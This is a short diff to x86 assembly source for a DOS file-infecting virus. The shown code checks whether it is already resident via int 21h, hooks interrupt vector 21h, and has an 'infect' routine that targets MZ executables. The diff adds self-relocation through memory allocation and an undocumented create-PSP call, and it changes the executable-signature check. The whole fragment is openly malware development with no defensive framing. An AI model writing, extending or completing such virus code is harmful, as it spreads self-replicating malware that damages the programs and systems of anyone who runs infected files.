@@ -18,6 +18,18 @@ start:
      int 21h          ; Call to int 21h
      cmp ax, 8b7bh    ; Is AX 8b7b?
      je dont_install
+
+alloc_mem:            ; We are in fact not in memory, lets relocate us away from here
+     mov ax, 4800h    ; Function 48h Allocate Memory Blocks
+     mov bx, 20h      ; Allocate 32 paragraphs, 512 bytes
+     int 21h          ; Calling DOS
+     mov dx, ax       ; DX => AX
+     mov ax, 5500h    ; Create New PSP (Undocumented..... ooooo, spooky)
+     mov si, 15h      ; Top of Memory
+     int 21h          ; Call DOS
+     
+
+
 install:
      mov ax, 3521h    ; Get vector 21h
      int 21h          ; call int 21h
@@ -89,7 +101,7 @@ infect:               ; DS:DX = ASCIIZ Filename pointer
      pop bp
      int 21h          ; Calling int 21h
      pop bx
-     cmp word [data_section.MZ_BUF+bp], 'ZM'  ; Is it a MZ file?
+     cmp word [data_section.MZ_BUF+bp], 'MZ'  ; Is it a MZ file?
      je .abort_infection
      push bx
 
